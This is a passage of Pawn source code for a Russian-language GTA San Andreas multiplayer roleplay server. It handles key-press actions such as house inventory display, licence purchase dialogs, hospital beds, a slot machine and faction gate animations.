						for (new i = 0; i < 7; i++) GetPlayerWeaponData(playerid, i, weapons[i], ammo[i]);
						for(new i = 0; i < 36; i++)
						{
						    if(HInfo[GetPVarInt(playerid,"PlayerHouse")][hInvSlot][i])
							{
		     					PlayerTextDrawSetPreviewModel(playerid, InventoryP1[i][playerid], InvType[HInfo[GetPVarInt(playerid,"PlayerHouse")][hInvSlot][i]][invObj]);
					            PlayerTextDrawSetPreviewRot(playerid, InventoryP1[i][playerid], InvType[HInfo[GetPVarInt(playerid,"PlayerHouse")][hInvSlot][i]][invRot][0], InvType[HInfo[GetPVarInt(playerid,"PlayerHouse")][hInvSlot][i]][invRot][1], InvType[HInfo[GetPVarInt(playerid,"PlayerHouse")][hInvSlot][i]][invRot][2], InvType[HInfo[GetPVarInt(playerid,"PlayerHouse")][hInvSlot][i]][invRot][3]);
					 	//		PlayerTextDrawBackgroundColor(playerid, InventoryP[i][playerid], 0x8C8C8C00);
					 			PlayerTextDrawShow(playerid,InvAmm1[playerid][i]);
					 			format(str,sizeof(str),"%d",HInfo[GetPVarInt(playerid,"PlayerHouse")][hInvKol][i]);
								PlayerTextDrawSetString(playerid,InvAmm1[playerid][i],str);
							}
							else
					 		{
					 		    PlayerTextDrawSetPreviewModel(playerid, InventoryP1[i][playerid], InvType[0][invObj]);
								PlayerTextDrawSetPreviewRot(playerid, InventoryP1[i][playerid], InvType[0][invRot][0], InvType[0][invRot][1], InvType[0][invRot][2], InvType[0][invRot][3]);
					 		}
						    if(i >= 0 && i<= 5)
						    {
						 	    if(ammo[i+1])
								{
									
									gun = GiveID(weapons[i+1]);
									PlayerTextDrawSetPreviewModel(playerid, InventoryP[i][playerid], InvType[gun][invObj]);
	     		 					PlayerTextDrawSetPreviewRot(playerid, InventoryP[i][playerid], InvType[gun][invRot][0], InvType[gun][invRot][1], InvType[gun][invRot][2], InvType[gun][invRot][3]);
									PlayerTextDrawShow(playerid,InvAmm[playerid][i]);
						 			format(str,sizeof(str),"%d",ammo[i+1]);
									PlayerTextDrawSetString(playerid,InvAmm[playerid][i],str);
						 	    }
						 	    else
						 	    {
									PlayerTextDrawSetPreviewModel(playerid, InventoryP[i][playerid], InvType[0][invObj]);
									PlayerTextDrawSetPreviewRot(playerid, InventoryP[i][playerid], InvType[0][invRot][0], InvType[0][invRot][1], InvType[0][invRot][2], InvType[0][invRot][3]);
						 	    }
						    }

						    if(i > 5 && i < 36)
						    {
						        
						 	    if(InvInfo[playerid][iSlot][i-6])
						 	    {
						            PlayerTextDrawSetPreviewModel(playerid, InventoryP[i][playerid], InvType[InvInfo[playerid][iSlot][i-6]][invObj]);
						            PlayerTextDrawSetPreviewRot(playerid, InventoryP[i][playerid], InvType[InvInfo[playerid][iSlot][i-6]][invRot][0], InvType[InvInfo[playerid][iSlot][i-6]][invRot][1], InvType[InvInfo[playerid][iSlot][i-6]][invRot][2], InvType[InvInfo[playerid][iSlot][i-6]][invRot][3]);
						 	//		PlayerTextDrawBackgroundColor(playerid, InventoryP[i][playerid], 0x8C8C8C00);
						 			PlayerTextDrawShow(playerid,InvAmm[playerid][i]);
						 			format(str,sizeof(str),"%d",InvInfo[playerid][iKol][i-6]);
									PlayerTextDrawSetString(playerid,InvAmm[playerid][i],str);
						 		}
						 		else
						 		{
						 		    PlayerTextDrawSetPreviewModel(playerid, InventoryP[i][playerid], InvType[0][invObj]);
									PlayerTextDrawSetPreviewRot(playerid, InventoryP[i][playerid], InvType[0][invRot][0], InvType[0][invRot][1], InvType[0][invRot][2], InvType[0][invRot][3]);
						 		}
							}
							PlayerTextDrawShow(playerid,InventoryP[i][playerid]);
							PlayerTextDrawShow(playerid,InventoryP1[i][playerid]);
						}

						if(!PlayerInfo[playerid][pUl][2])
						{
						    TextDrawHideForPlayer(playerid,Inventory[5]);
						    TextDrawHideForPlayer(playerid,Inventory[6]);
						    TextDrawHideForPlayer(playerid,Inventory[7]);
						    TextDrawHideForPlayer(playerid,Inventory[8]);
						    TextDrawHideForPlayer(playerid,Inventory[9]);
						    TextDrawHideForPlayer(playerid,Inventory[10]);
							TextDrawHideForPlayer(playerid,Inventory[13]);
							TextDrawHideForPlayer(playerid,Inventory[14]);
						}
	                    if(!HInfo[playerid][hUl][0])
						{
						    TextDrawHideForPlayer(playerid,Inventory1[5]);
						    TextDrawHideForPlayer(playerid,Inventory1[6]);
						    TextDrawHideForPlayer(playerid,Inventory1[7]);
						    TextDrawHideForPlayer(playerid,Inventory1[8]);
						    TextDrawHideForPlayer(playerid,Inventory1[9]);
						    TextDrawHideForPlayer(playerid,Inventory1[10]);
							TextDrawHideForPlayer(playerid,Inventory1[13]);
							TextDrawHideForPlayer(playerid,Inventory1[14]);
						}
						SetPVarInt(playerid,"OpenHouse",1);

						SelectTextDraw(playerid, 0xFFCC00FF);
						SendClientMessage(playerid,CGREY,"Для закрытия шкафа используйте кнопку 'ESC'");
				   // ShowPlayerDialog(playerid,118,DIALOG_STYLE_LIST,"Шкаф","{FFFFFF}1 | Положить\n2 | Взять\n3 | Информация","Далее","Назад");
				}
			}
	    }
	
	    if(PlayerInfo[playerid][pMember] == F_ARMY && GetPVarInt(playerid,"Vzlom") == 0 && GetPVarInt(playerid,"ArmyW") == 1)
	    {
	        new kek = -1;
	        for(new i = 0; i <= 7; i++)
			{
				if(IsPlayerInRangeOfPoint(playerid,2.0,objectzavod[i][0], objectzavod[i][1], objectzavod[i][2]))
				{
					kek = i;
					break;
				}
			}
			if(kek != -1)
			{
				new obj1 = CreateDynamicObjectEx(2041, objectzavod[kek][3], objectzavod[kek][4], objectzavod[kek][5],  objectzavod[kek][6], objectzavod[kek][7], objectzavod[kek][8],300.0,300.0);
				SetPVarInt(playerid,"ArmyObj1",obj1);
				SetPlayerFacingAngle(playerid,objectzavod[kek][9]);
				if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
				SetPlayerSpecialAction(playerid,0);
				ApplyAnimation(playerid, "OTB", "BETSLP_LOOP",4.0,1,0,0,0,0,1);
				SetPVarInt(playerid,"Vzlom",10);
				Streamer_Update(playerid);
				StartGame(playerid);
			}
	    }
	    if(IsPlayerInRangeOfPoint(playerid,1.0,2177.2578,-1761.8013,13.5469))
	    {
			if(GetPVarInt(playerid,"LicsW") == 1)
			{
			    SendClientMessage(playerid,CGREY,"Принесите шаблоны из ближайшего полицейского участка!");
			    return 1;
			}
	        if(GetPVarInt(playerid,"LicsW") == 2)
			{
			    SendClientMessage(playerid,CREWARD,"Вы получили поддельную лицензию!");
		        SendClientMessage(playerid,CREWARD,"Внимание! При показе полиции будет видно, что лицензия поддельная");
		        PlayerInfo[playerid][pLic][GetPVarInt(playerid,"Lics")] = 2;
		        PlayerInfo[playerid][pLicTime][GetPVarInt(playerid,"Lics")] = gettime()+60*60*24*90;
		        GiveInv(playerid,449,1);
		        DeletePVar(playerid,"Lics");
		        DeletePVar(playerid,"LicsW");
		        return 1;
			}
     		ShowPlayerDialog(playerid,445,DIALOG_STYLE_LIST,"Покупка лицензий","Лицензия на автомобиль\n\
			Лицензия на мототранспорт\n\
			Лицензия на водный транспорт\n\
			Лицензия на воздушный транспорт\n\
			Лицензия на автобус\n\
			Лицензия на грузовой транспорт\n\
			Лицензия на ношение оружия","Далее","Отмена");
			
		
	    }
	    for(new i = 0; i < sizeof(JobBotPos); i++)
		{
		    if(!IsPlayerInRangeOfPoint(playerid,1.0,JobBotPos[i][0],JobBotPos[i][1],JobBotPos[i][2])) continue;
		    ShowPlayerDialog(playerid,148,DIALOG_STYLE_MSGBOX,"Приём на работу","{FFFFFF}Хочешь устроиться к нам на работу?","Да","Нет");
		    SetPVarInt(playerid,"Actor",i);
		    break;
		}
		for(new i = 0; i < sizeof(Computer); i++)
		{
		    if(!IsPlayerInRangeOfPoint(playerid,2.0,Computer[i][0],Computer[i][1],Computer[i][2]) || GetPlayerInterior(playerid) != 1) continue;
		    if(PlayerInfo[playerid][pTest]) return SendClientMessage(playerid,CGREY,"У Вас уже пройдено теоретическое тестирование!");
		    query = "";
			format(query,sizeof(query),"%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s",PDD[0],PDD[1],PDD[2],PDD[3],PDD[4]
			,PDD[5],PDD[6],PDD[7],PDD[8],PDD[9],PDD[10],PDD[11],PDD[12],PDD[13],PDD[14],PDD[15]
			,PDD[16],PDD[17]);
			ShowPlayerDialog(playerid,408,DIALOG_STYLE_MSGBOX,"Теория",query,"Далее","Отмена");
			break;
		    
		}
		if(GetPlayerVirtualWorld(playerid) == 2 && GetPlayerInterior(playerid) == 2)
		{
			new str_koy[130];
			if(GetPVarInt(playerid,"HealBed") && GetPVarInt(playerid,"HealTime") < gettime())
			{
			    ClearAnim(playerid);
			    TogglePlayerControllable(playerid, 1);
				SendClientMessage(playerid,CREWARD,"Вы встали с койки");
				new i = GetPVarInt(playerid,"HealBed")-1;
				if(i > 15) format(str_koy,sizeof(str_koy),"{f7ae11}[Койка]{ffffff}\nСтатус: {f7ae11}Свободна{ffffff}\nЦена: {f7ae11}%d${ffffff}\nИспользуйте: {f7ae11}H",KoykaCena);
				else format(str_koy,sizeof(str_koy),"{f7ae11}[Койка]{ffffff}\nСтатус: {f7ae11}Свободна{ffffff}\nЦена: {f7ae11}Бесплатно{ffffff}\nИспользуйте: {f7ae11}H");
				UpdateDynamic3DTextLabelText(KoykaText[i],CWHITE,str_koy);
				StatusKoyka[i] = false;
				DeletePVar(playerid,"HealBed");
				DeletePVar(playerid,"HealTime");

			}
			for(new i = 0; i < sizeof(Koyka); i++)
			{
				if(!IsPlayerInRangeOfPoint(playerid,2.0,Koyka[i][0],Koyka[i][1],Koyka[i][2]) || GetPVarInt(playerid,"HealBed")) continue;
				if(!PlayerInfo[playerid][pNHeal]) return SendClientMessage(playerid,CGREY,"Вы здоровы!");
				if(StatusKoyka[i]) return SendClientMessage(playerid,CGREY,"Койка занята!");
				if(i > 15)
				{
				    if(PlayerInfo[playerid][pCash] < KoykaCena) return SendClientMessage(playerid,CGREY,"Недостаточно средств");
				    GiveMoney(playerid,-KoykaCena);
					format(str_koy,sizeof(str_koy),"{f7ae11}[Койка]{ffffff}\nСтатус: {f7ae11}Занята{ffffff}\nЦена: {f7ae11}%d$",KoykaCena);
				}
				else format(str_koy,sizeof(str_koy),"{f7ae11}[Койка]{ffffff}\nСтатус: {f7ae11}Занята{ffffff}\nЦена: {f7ae11}Бесплатно");
				UpdateDynamic3DTextLabelText(KoykaText[i],CWHITE,str_koy);
				SetPlayerPos(playerid,Koyka[i][0],Koyka[i][1],Koyka[i][2]);
				SetPlayerFacingAngle(playerid,Koyka[i][3]);
				ApplyAnimation(playerid, "CRACK", "crckidle2", 4.1, 0, 1, 1, 1, 0, 1);
			    SendClientMessage(playerid,-1,"Для того, чтобы встать используйте: {f7ae11}H");
				SetPVarInt(playerid,"HealBed",i+1);
				SetPVarInt(playerid,"HealTime",gettime()+3);
			}
			
		}


		if(IsPlayerInRangeOfPoint(playerid,4.0,1396.4656,-12.5576,1000.9153) && GetPlayerInterior(playerid) == 1 && GetPlayerVirtualWorld(playerid) == 1)
		{
		    query = "";
		    strcat(query,"{ffffff}Здравствуйте, добро пожаловать в автошколу города Las Venturas!\n\n{f7ae11}1. Первый этаж.{ffffff}\n\tПолучение прав на автомобили.\n\tПолучение прав на грузовой транспорт.\n\tПолучение прав на автобус.\n\tПолучение прав на мототранспорт.\n\n{f7ae11}2. Второй этаж.{ffffff}\n\tПолучение прав на водный транспорт.\n");
			strcat(query,"\tПолучение прав на воздушный транспорт.\n\tПолучение прав на ношение оружия.");
			ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,"Автошкола",query,"Далее","");
		}
	    if(IsPlayerInRangeOfPoint(playerid,3.0,AshBotPos[0][0],AshBotPos[0][1],AshBotPos[0][2]) && GetPlayerInterior(playerid) == 1 && GetPlayerVirtualWorld(playerid) == 1)
	    {
	        if(PlayerInfo[playerid][pLic][L_VOZ]) return SendClientMessage(playerid,CGREY,"У Вас уже есть права данной категории!");
		    ShowPlayerDialog(playerid,429,DIALOG_STYLE_MSGBOX,"Права на управление водушным транспортом","{ffffff}Вы действительно хотите приобрести права на управление водушным транспортом?\n\nЦена: {f7ae11}650$","Да","Нет");
	    }
	    if(IsPlayerInRangeOfPoint(playerid,3.0,AshBotPos[1][0],AshBotPos[1][1],AshBotPos[1][2]) && GetPlayerInterior(playerid) == 1 && GetPlayerVirtualWorld(playerid) == 2)
	    {
	        if(PlayerInfo[playerid][pLic][L_VOD]) return SendClientMessage(playerid,CGREY,"У Вас уже есть права данной категории!");
		    ShowPlayerDialog(playerid,430,DIALOG_STYLE_MSGBOX,"Права на управление водным транспортом","{ffffff}Вы действительно хотите приобрести права на управление водным транспортом?\n\nЦена: {f7ae11}450$","Да","Нет");
	    }
	    if(IsPlayerInRangeOfPoint(playerid,3.0,AshBotPos[3][0],AshBotPos[3][1],AshBotPos[3][2]) && GetPlayerInterior(playerid) == 1 && GetPlayerVirtualWorld(playerid) == 1)
	    {
	        if(PlayerInfo[playerid][pLic][L_MOTO]) return SendClientMessage(playerid,CGREY,"У Вас уже есть права данной категории!");
		    if(!PlayerInfo[playerid][pTest]) ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,"Права на управление мототранспорта","{ffffff}Для получения прав на управление мототранспорта Вам требуется:\n\n{f7ae11}1. Пройти теоретическое тестирование.{ffffff}\n\tДля прохождения используйите компьютер в аудитории.\n\n{f7ae11}2. Пройти практическое тестирование.{ffffff}\n\tДля начала подойдите сюда после успешного завершения предыдущего первого тестирования.","Далее","");
            else SetPVarInt(playerid,"WhatLic",L_MOTO),ShowPlayerDialog(playerid,108,DIALOG_STYLE_MSGBOX,"Права на управление мототранспорта","{ffffff}Вы действительно хотите начать практическое тестирование?\n\nЦена: {f7ae11}100$","Да","Нет");
		}
	    if(IsPlayerInRangeOfPoint(playerid,3.0,AshBotPos[4][0],AshBotPos[4][1],AshBotPos[4][2]) && GetPlayerInterior(playerid) == 1 && GetPlayerVirtualWorld(playerid) == 1)
	    {
	        if(PlayerInfo[playerid][pLic][L_BUS]) return SendClientMessage(playerid,CGREY,"У Вас уже есть права данной категории!");
		    if(!PlayerInfo[playerid][pTest])ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,"Права на управление автобусами","{ffffff}Для получения прав на управление автобуса Вам требуется:\n\n{f7ae11}1. Пройти теоретическое тестирование.{ffffff}\n\tДля прохождения используйите компьютер в аудитории.\n\n{f7ae11}2. Пройти практическое тестирование.{ffffff}\n\tДля начала подойдите сюда после успешного завершения предыдущего первого тестирования.","Далее","");
            else SetPVarInt(playerid,"WhatLic",L_BUS),ShowPlayerDialog(playerid,108,DIALOG_STYLE_MSGBOX,"Права на управление автобусами","{ffffff}Вы действительно хотите начать практическое тестирование?\n\nЦена: {f7ae11}170$","Да","Нет");
		}
	    if(IsPlayerInRangeOfPoint(playerid,3.0,AshBotPos[5][0],AshBotPos[5][1],AshBotPos[5][2]) && GetPlayerInterior(playerid) == 1 && GetPlayerVirtualWorld(playerid) == 1)
	    {
	        if(PlayerInfo[playerid][pLic][L_GRUZ]) return SendClientMessage(playerid,CGREY,"У Вас уже есть права данной категории!");
		    if(!PlayerInfo[playerid][pTest])ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,"Права на управление грузового транспорта","{ffffff}Для получения прав на управление грузового транспорта Вам требуется:\n\n{f7ae11}1. Пройти теоретическое тестирование.{ffffff}\n\tДля прохождения используйите компьютер в аудитории.\n\n{f7ae11}2. Пройти практическое тестирование.{ffffff}\n\tДля начала подойдите сюда после успешного завершения предыдущего первого тестирования.","Далее","");
            else SetPVarInt(playerid,"WhatLic",L_GRUZ),ShowPlayerDialog(playerid,108,DIALOG_STYLE_MSGBOX,"Права на управление грузового транспорта","{ffffff}Вы действительно хотите начать практическое тестирование?\n\nЦена: {f7ae11}200$","Да","Нет");
		}
	    if(IsPlayerInRangeOfPoint(playerid,3.0,AshBotPos[6][0],AshBotPos[6][1],AshBotPos[6][2]) && GetPlayerInterior(playerid) == 1 && GetPlayerVirtualWorld(playerid) == 1)
	    {
	        if(PlayerInfo[playerid][pLic][L_AVTO]) return SendClientMessage(playerid,CGREY,"У Вас уже есть права данной категории!");
		    if(!PlayerInfo[playerid][pTest])ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,"Права на управление автомобилями","{ffffff}Для получения прав на управление автомобиля Вам требуется:\n\n{f7ae11}1. Пройти теоретическое тестирование.{ffffff}\n\tДля прохождения используйите компьютер в аудитории.\n\n{f7ae11}2. Пройти практическое тестирование.{ffffff}\n\tДля начала подойдите сюда после успешного завершения предыдущего первого тестирования.","Далее","");
		    else SetPVarInt(playerid,"WhatLic",L_AVTO),ShowPlayerDialog(playerid,108,DIALOG_STYLE_MSGBOX,"Права на управление автомобилями","{ffffff}Вы действительно хотите начать практическое тестирование?\n\nЦена: {f7ae11}150$","Да","Нет");
	    }
	    if(IsPlayerInRangeOfPoint(playerid,3.0,AshBotPos[2][0],AshBotPos[2][1],AshBotPos[2][2]) && GetPlayerInterior(playerid) == 1 && GetPlayerVirtualWorld(playerid) == 2)
	    {
	        if(PlayerInfo[playerid][pLic][L_GUN]) return SendClientMessage(playerid,CGREY,"У Вас уже есть права данной категории!");
		    ShowPlayerDialog(playerid,472,DIALOG_STYLE_MSGBOX,"Права на ноншение оружия","{ffffff}Вы действительно хотите приобрести права на управление водным транспортом?\n\nЦена: {f7ae11}750$","Да","Нет");
	    }
		if(IsPlayerInRangeOfPoint(playerid,3.0,1345.8383,1569.6537,1010.8253))
		{
		    ShowPlayerDialog(playerid,364,DIALOG_STYLE_MSGBOX,"Приём на работу","{FFFFFF}Хочешь устроиться к нам на работу?","Да","Нет");
		}
		
		if(GetPVarInt(playerid,"Medic") > 0 && GetPVarInt(playerid,"MedicW") == 2 && GetPVarInt(playerid,"Vzlom") == 0)
		{
			new kek = -1;
	        for(new i = 0; i <= 11; i++)
			{
				if(IsPlayerInRangeOfPoint(playerid,1.0,sa11738[i][9], sa11738[i][10], sa11738[i][11]))
				{
					kek = i;
					break;
				}
			}
			if(kek != -1)
			{
			    SetPlayerPos(playerid,sa11738[kek][9], sa11738[kek][10], sa11738[kek][11]);
			    /*11738*/ /*11736*/ /*11748*/
			    SetPlayerFacingAngle(playerid,sa11738[kek][12]);
			    if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
				if(IsPlayerAttachedObjectSlotUsed(playerid, 2)) RemovePlayerAttachedObject(playerid, 2);
				new obj1 = CreateDynamicObjectEx(11738, sa11738[kek][0], sa11738[kek][1], sa11738[kek][2],   0.00000, 0.00000, 0.00000,500.0,500.0);
				new obj2 = CreateDynamicObjectEx(11736, sa11738[kek][3], sa11738[kek][4], sa11738[kek][5],   0.00000, 0.00000, 0.00000,500.0,500.0);
				new obj3 = CreateDynamicObjectEx(11748, sa11738[kek][6], sa11738[kek][7], sa11738[kek][8],   0.00000, 0.00000, 0.00000,500.0,500.0);
				SetPVarInt(playerid,"MedicObj1",obj1);
				SetPVarInt(playerid,"MedicObj2",obj2);
				SetPVarInt(playerid,"MedicObj3",obj3);
                ApplyAnimation(playerid, "OTB", "BETSLP_LOOP",4.0,1,0,0,0,0,1);
                SetPVarInt(playerid,"Vzlom",7);
                StartGame(playerid);
			}
		}
  		if(IsPlayerInRangeOfPoint(playerid,2.5,1968.35400, 1002.82202, 992.31671) || IsPlayerInRangeOfPoint(playerid,2.5, 1968.35400, 1032.69519, 992.31671))
  		{
  		    if(Gambling[playerid] != G_STATE_NOT_GAMBLING) return true;
			if(PlayerInfo[playerid][pCash] < 50) return SendClientMessage(playerid, CGREY, "Недостаточно средств");
			ShowInfo(playerid,"BET: 50$");
			GiveMoney(playerid,-50);
			SetPVarInt(playerid,"Start",1);
			PutPlayerInSlotMachine(playerid,50);
  		}
  		
  		/*
  		
	
  		*/
  		if(PlayerInfo[playerid][pMember] == F_LSPD && GetPlayerVirtualWorld(playerid) == 17 || PlayerInfo[playerid][pMember] == F_LVPD
		  && GetPlayerVirtualWorld(playerid) == 1)
		{
		    new Float:x,Float:y,Float:z;
		    new Float:rx,Float:ry,Float:rz;
			new doorobj;
			new Float:pdrz;
			new Float:px,Float:py,Float:pz;
			GetPlayerPos(playerid,px,py,pz);
			

	  		for(new i = 0; i < 16; i++)
	  		{
				if(!IsPlayerInDynamicArea(playerid,doorsp[i])) continue;
				doorobj = (GetPlayerVirtualWorld(playerid) == 17) ? (doorpd1[i]) : (doorpd[i]);
				Streamer_GetFloatData(STREAMER_TYPE_OBJECT, doorobj, E_STREAMER_R_Z, pdrz);
				GetDynamicObjectRot(doorobj,rx,ry,rz);
				printf("%d %d %d",i,floatround(rz), floatround(pdrz));
				if(!IsDynamicObjectMoving(doorobj) && floatround(rz) == floatround(pdrz))
				{
                    GetDynamicObjectRot(doorobj,rx,ry,rz);
                    GetDynamicObjectPos(doorobj,x,y,z);
                    Streamer_GetFloatData(STREAMER_TYPE_OBJECT, doorobj, E_STREAMER_EXTRA_ID, pdrz);
                    if(floatround(pdrz) == 0 || floatround(pdrz) == 180)
					{
					   	printf("%f ",(floatround(py) > y) ? (-90.0) : (90.0));
					    MoveDynamicObject(doorobj,x,y+0.02,z,0.12,   rx,ry,(floatround(py) > y) ? (-90.0) : (90.0));
						SetTimerEx("MoveObjectOpenRot",5000,false,"dfffffff",doorobj,x,y,z,0.12,   rx,ry,rz);
					}
					if(floatround(pdrz) == 90 || floatround(pdrz) == -90)
					{
				    	printf("%f ",(floatround(px) > x) ? (-2.0) : (180.0));
					    MoveDynamicObject(doorobj,x,y+0.02,z,0.12,   rx,ry,(floatround(px) < x) ? (-2.0) : (180.0));
						SetTimerEx("MoveObjectOpenRot",5000,false,"dfffffff",doorobj,x,y,z,0.12,   rx,ry,rz);
					}
					if(floatround(pdrz) == 540 || floatround(pdrz) == 360)
					{
				 		printf("%f ",(floatround(py) > y) ? (-270.0) : (270.0));
						MoveDynamicObject(doorobj,x,y+0.02,z,0.12,   rx,ry,(floatround(py) > y) ? (270.0) : (-270.0));
						SetTimerEx("MoveObjectOpenRot",5000,false,"dfffffff",doorobj,x,y,z,0.12,   rx,ry,rz);
					}
				}
	  		}
  		}
        if(PlayerInfo[playerid][pMember] == F_LSPD)
        {
            if(IsPlayerInDynamicArea(playerid,lspdsp[0]) && !IsDynamicObjectMoving(lspd[0]))
	   		{
	   		    SetPlayerFacingAngle(playerid,89.9784);
	   		    ApplyAnimation(playerid, "CRIB", "CRIB_Use_Switch",4.1, 0, 0, 0, 0, 0,1);
	   		    new Float:x,Float:y,Float:z;
				GetDynamicObjectRot(lspd[0],x,y,z);
				if(y == 89.00000)
				{
					MoveDynamicObject(lspd[0],1544.70789, -1630.89185+0.2, 13.03080,0.12,   0.00000, 0.00000, 90.00000);
					SetTimerEx("MoveObjectOpenRot",5000,false,"dfffffff",lspd[0],1544.70789, -1630.89185, 13.03080,0.12,   0.00000, 89.00000, 90.00000);
				}
	   		}
	   		if(IsPlayerInDynamicArea(playerid,lspdsp[1]) && !IsDynamicObjectMoving(lspd[1]))
	   		{
	   		    SetPlayerFacingAngle(playerid,175.8091);
	   		    ApplyAnimation(playerid, "CRIB", "CRIB_Use_Switch",4.1, 0, 0, 0, 0, 0,1);
	   		    new Float:dx,Float:dy,Float:dz;
	  		    GetDynamicObjectPos(lspd[1],dx,dy,dz);
	  		   	if(dz == 14.73610)
			  	{
					MoveDynamicObject(lspd[1],dx,dy,7.89249,2);
					SetTimerEx("MoveObjectOpen",5000,false,"dffff",lspd[1],dx,dy,14.73610,2.0);
				}
	   		}
        }
		if(PlayerInfo[playerid][pMember] == F_LVPD)
  		{

            if(IsPlayerInDynamicArea(playerid,fcpdsp[0]) && !IsDynamicObjectMoving(fcpdgate[0]))
	   		{
	   		    SetPlayerFacingAngle(playerid,184.4266);
	   		    ApplyAnimation(playerid, "CRIB", "CRIB_Use_Switch",4.1, 0, 0, 0, 0, 0,1);
	   		    MoveDynamicObject(fcpdgate[0],-206.26221, 974.95380+0.1, 18.53900,0.12,   0.00000, 0.00000, -89.28000);
	   		    SetTimerEx("MoveObjectOpenRot",5000,false,"dfffffff",fcpdgate[0],-206.26221, 974.95380-0.1, 18.53900,0.12,   0.00000, -89.56000, -89.00000);

			}
			if(IsPlayerInDynamicArea(playerid,fcpdsp[1]) && !IsDynamicObjectMoving(fcpdgate[1]))
	   		{
	   		    SetPlayerFacingAngle(playerid,269.3173);
	   		    ApplyAnimation(playerid, "CRIB", "CRIB_Use_Switch",4.1, 0, 0, 0, 0, 0,1);
	   		    MoveDynamicObject(fcpdgate[1],-215.73421, 1007.72046+0.1, 19.37720,0.12,  0.00000, 0.00000, -1.86000);
	   		    SetTimerEx("MoveObjectOpenRot",5000,false,"dfffffff",fcpdgate[1],-215.73421, 1007.72052-0.1, 19.37720,0.12,  0.00000, -89.72000, -2.00000);

			}
	  		if(IsPlayerInDynamicArea(playerid,lvpdsp) && !IsDynamicObjectMoving(lvpdsh))
	   		{
	   		    new Float:x,Float:y,Float:z;
	   		    SetPlayerFacingAngle(playerid,93.8173);
				GetDynamicObjectRot(lvpdsh,x,y,z);
				ApplyAnimation(playerid, "CRIB", "CRIB_Use_Switch",4.1, 0, 0, 0, 0, 0,1);
				if(y == 90.00000) {
				MoveDynamicObject(lvpdsh,2238.19629, 2450.41284, 10.38020,0.12,   0.00000, 0.00000, 90.00000);
				//else MoveDynamicObject(lvpdsh,2238.19629, 2450.33276, 10.72020,0.12,   0.00000, 90.00000, 90.00000);
				SetTimerEx("MoveObjectOpenRot",5000,false,"dfffffff",lvpdsh,2238.19629, 2450.33276, 10.72020,0.12,   0.00000, 90.00000, 90.00000);
				}
			}
		}
		if(PlayerInfo[playerid][pMember] == F_ARMY)
  		{
  		    
	  		if((IsPlayerInDynamicArea(playerid,areagsp[0]) || IsPlayerInDynamicArea(playerid,areagsp[1])) && !IsDynamicObjectMoving(areagate[0]))
	   		{
	   		    new Float:x,Float:y,Float:z;
	   		    if(IsPlayerInDynamicArea(playerid,areagsp[0])) SetPlayerFacingAngle(playerid,91.7476);
	   		    else if(IsPlayerInDynamicArea(playerid,areagsp[1])) SetPlayerFacingAngle(playerid,268.6418);
				GetDynamicObjectPos(areagate[0],x,y,z);
				ApplyAnimation(playerid, "CRIB", "CRIB_Use_Switch",4.1, 0, 0, 0, 0, 0,1);
				if(x == 135.21449)  {
				MoveDynamicObject(areagate[0],121.10500, y, z,4);
				SetTimerEx("MoveObjectOpen",5000,false,"dffff",areagate[0],135.21449, y, z,4.0);
				}
			//	else MoveDynamicObject(areagate[0],135.21449, y, z,4);
			}
			

			if((IsPlayerInDynamicArea(playerid,areagsp[2]) || IsPlayerInDynamicArea(playerid,areagsp[3])) && !IsDynamicObjectMoving(areagate[1]))
	   		{
	   		    new Float:x,Float:y,Float:z;
	   		    if(IsPlayerInDynamicArea(playerid,areagsp[2])) SetPlayerFacingAngle(playerid,2.6711);
	   		    else if(IsPlayerInDynamicArea(playerid,areagsp[3])) SetPlayerFacingAngle(playerid,183.1634);
				GetDynamicObjectPos(areagate[1],x,y,z);
				ApplyAnimation(playerid, "CRIB", "CRIB_Use_Switch",4.1, 0, 0, 0, 0, 0,1);
				if(y == 1821.27307)  {
				MoveDynamicObject(areagate[1],x, 1835.32739, z,4);
				SetTimerEx("MoveObjectOpen",5000,false,"dffff",areagate[1],x, 1821.27307, z,4.0);
				}
				//MoveDynamicObject(areagate[1],x, 1821.27307, z,4);
			}
			

		}
		if(IsAGang(playerid) || IsAMafia(playerid))
		{
			if((IsPlayerInDynamicArea(playerid,checkmap[0]) || IsPlayerInDynamicArea(playerid,checkmap[1])) && GetPlayerVirtualWorld(playerid) == PlayerInfo[playerid][pMember] && !GetPVarInt(playerid,"ShowMap"))
	  	    {
	  	        if(GetPVarInt(playerid,"AntiFloodMap") > gettime()) return SendClientMessage(playerid,CGREY,"Не флуди!");
				SetPVarInt(playerid,"ShowMap",1);
				for(new i = 0; i <= 7; i++) TextDrawShowForPlayer(playerid,ShowMap[i]);
				SetPVarInt(playerid,"AntiFloodMap",gettime() + 2);
				return 1;
	  	    }
	    }
	    if(GetPVarInt(playerid,"ShowMap"))
		{
		    for(new i = 0; i <= 7; i++) TextDrawHideForPlayer(playerid,ShowMap[i]);
		    DeletePVar(playerid,"ShowMap");
		}
		if(PlayerInfo[playerid][pMember] == F_LIC || GetPVarInt(playerid,"LicTest"))
		{
		    if(IsPlayerInDynamicArea(playerid,ashsp) && !IsDynamicObjectMoving(ashshlag))
	   		{
	   		    new Float:dx,Float:dy,Float:dz;
	  		    GetDynamicObjectPos(ashshlag,dx,dy,dz);
	  		    if(dy == -90.000015)
			  	{
				  	MoveDynamicObject(turmagate[0],dx,0.0,dz,2);
		  		    SetTimerEx("MoveObjectOpen",5000,false,"dffff",ashshlag,dx,-90.000015,dz,2.0);
			  	}
	   		}
		}
  		if(IsAGos(playerid))
  		{
           
	  		if(IsPlayerInDynamicArea(playerid,arenagate[0]) && !IsDynamicObjectMoving(arenagate[0]))
	   		{
	   		    SetPlayerFacingAngle(playerid,184.4218);
	   		    ApplyAnimation(playerid, "CRIB", "CRIB_Use_Switch",4.1, 0, 0, 0, 0, 0,1);
	            new Float:dx,Float:dy,Float:dz;
	  		    GetDynamicObjectPos(turmagate[0],dx,dy,dz);
	  		    new Float:dx1,Float:dy1,Float:dz1;
	  		    GetDynamicObjectPos(turmagate[1],dx1,dy1,dz1);
	  		    if(dy == 1415.695)
			  	{
